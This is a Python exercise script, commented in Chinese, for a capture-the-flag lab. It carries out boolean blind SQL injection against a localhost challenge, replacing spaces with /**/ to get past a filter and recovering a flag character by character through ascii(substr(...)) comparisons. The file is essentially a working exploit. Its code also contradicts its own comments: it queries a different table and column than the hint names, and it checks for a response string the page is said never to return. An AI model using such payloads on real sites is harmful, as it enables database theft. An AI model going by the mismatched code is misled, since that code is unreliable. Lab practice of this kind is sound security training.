# 🎓 你的第一支 exp：si5b 布尔盲注脚本（requests 版，自己补全 TODO！）
# 运行：python my_first_exp.py
# 目标：逐字符提取 flag{si5b_blind_comment_space}
# 已知：表名 flag5b_table（提示里有）；页面只有'查询到了'/'商品不存在'两种反应
# 注意：题目过滤了空格！payload 里所有空格要用 /**/ 代替

import requests  # 引入 requests 库（你已经装好了）

URL = "http://localhost:8083/sifinal/?ticket="

def ask(cond):
    payload = "1/**/and/**/" + cond
    url = URL +payload
    resp = requests.get(url).text
    return "处理中" in resp

flag = ''
for pos in range(1, 60):
    lo, hi = 32, 127
    while lo < hi:
        mid = (lo + hi) // 2
        # TODO 4: 构造条件（提示：ascii(substr((select/**/flag/**/from/**/flag5b_table),第几位,1)) > mid）
        #         注意 cond 里不能有空格！用 % 把 pos 和 mid 填进去
        cond = "ascii(substr((SElect/**/d4ta/**/from/**/fl4gs/**/limit/**/0,1),%d,1))>%d" %(pos,mid)
        if ask(cond):
            lo = mid + 1
        else:
            hi = mid
    ch = chr(lo)
    if ch == ' ':  # 越界（字符串结束了）
        break
    flag += ch
    print(flag)
    if ch == '}':
        break

print("FLAG:", flag)
